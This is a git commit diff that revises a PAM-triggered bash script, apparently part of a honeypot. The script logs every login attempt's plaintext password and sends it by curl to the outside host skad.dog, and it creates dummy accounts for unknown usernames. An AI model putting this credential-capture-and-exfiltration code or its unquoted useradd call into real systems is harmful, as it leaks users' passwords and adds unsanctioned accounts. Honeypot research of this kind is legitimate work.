096a864d02a52065c0d2fa912da50b022ed0e896
scottclee <scott.john.clee@gmail.com>
2016-06-19 12:11:18 +0100

    Clean up register script

--- scripts/register_attempt.sh
+++ scripts/register_attempt.sh
@@ -1,26 +1,22 @@
 #!/bin/bash
 
-# The password is passed into the script via stdin
 read password
 
-# PAM blats passwords for accounts that don't exist (to stop password leaks).
-# So get hex value of the password and compare against the dummy value
 hexval=$(xxd -pu <<< "$password")
 
+# PAM blanks out passwords for accounts that don't exist (to stop password leaks) so create a dummy account with that username so next time the password is captured the next time that userid is tried
 if [[ $hexval == "080a" ]]; then
 
-# Create a new user with the username so next time the password is captured the next time that userid is tried
 `useradd -M -s /bin/false $PAM_USER`
-#echo "Creating new user: $PAM_USER" >> /tmp/password.txt
 
 else 
 
-URL="https://skad.dog/attemptedlogin"
+URL="https://skad.dog/attempt.php"
 DATE=`date "+%Y%m%d"`
 TIME_STAMP=`date "+%Y%m%d-%H%M%S"`
 UNAME=`uname -a`
 # The key should be stored in a local file
-KEY="abcdefg"
+KEY=`cat /sys/class/net/eth0/address`
 
 read -r -d '' JSON << EOM
 {
@@ -31,14 +27,19 @@ read -r -d '' JSON << EOM
 	"rhost": "$PAM_RHOST",
 	"service": "$PAM_SERVICE",
 	"TTY": "$PAM_TTY",
-	"uname": "$UNAME"
+	"uname": "$UNAME",
 	"key": "$KEY"
 }
 EOM
 
 LOG_ENTRY="$TIME_STAMP, $PAM_USER, $password, $PAM_RUSER, $PAM_RHOST, $PAM_SERVICE, $PAM_TTY, $UNAME"
 
-#curl -X POST $URL -d '$JSON'
 echo "$LOG_ENTRY" >> /var/log/skad_dog.log
+
+JSON_FILE="/tmp/json.$TIME_STAMP.$RANDOM"
+echo "$JSON" > $JSON_FILE
+CMD="curl -i -X POST -d @$JSON_FILE $URL"
+`$CMD` &> /dev/null
+`rm $JSON_FILE`
 
 fi
